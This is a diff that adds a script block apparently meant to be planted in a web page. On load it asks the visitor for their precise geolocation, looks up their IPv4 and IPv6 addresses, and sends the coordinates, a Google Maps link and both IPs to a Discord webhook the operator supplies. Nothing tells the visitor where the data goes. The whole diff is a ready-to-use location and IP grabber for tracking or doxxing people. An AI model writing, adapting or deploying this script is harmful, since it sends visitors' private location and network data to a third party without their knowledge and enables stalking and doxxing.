@@ -1,0 +1,62 @@
+<script>
+  const DISCORD_WEBHOOK_URL = "YOUR WEBHOOK URL HERE";  // Replace with your actual Discord webhook URL
+
+  window.addEventListener('load', getLocation);
+
+  function getLocation() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(showPosition);
+    } else {
+      alert("Browser error");
+    }
+  }
+
+  function showPosition(position) {
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
+    getIPv4()
+      .then((ipv4) => {
+        getIPv6()
+          .then((ipv6) => {
+            const embedContent = {
+              content: "Here are the details:",
+              embeds: [
+                {
+                  title: "Location Details",
+                  description: `Google Maps: [Google Maps Link](https://www.google.com/maps?q=${latitude},${longitude})\nLatitude: ${latitude}\nLongitude: ${longitude}\nIPv4: ${ipv4}\nIPv6: ${ipv6}`
+                }
+              ]
+            };
+            sendToDiscord(embedContent);
+          })
+          .catch((error) => console.error("Error fetching IPv6:", error));
+      })
+      .catch((error) => console.error("Error fetching IPv4:", error));
+  }
+
+  function getIPv4() {
+    return fetch("https://api64.ipify.org?format=json")
+      .then((response) => response.json())
+      .then((data) => data.ip)
+      .catch((error) => console.error("Error fetching IPv4:", error));
+  }
+
+  function getIPv6() {
+    return fetch("https://api64.ipify.org?format=jsonv6")
+      .then((response) => response.json())
+      .then((data) => data.ip)
+      .catch((error) => console.error("Error fetching IPv6:", error));
+  }
+
+  function sendToDiscord(content) {
+    fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(content)
+    })
+    .then(() => console.log("Sent to Discord:", content))
+    .catch((error) => console.error("Error sending to Discord:", error));
+  }
+</script>
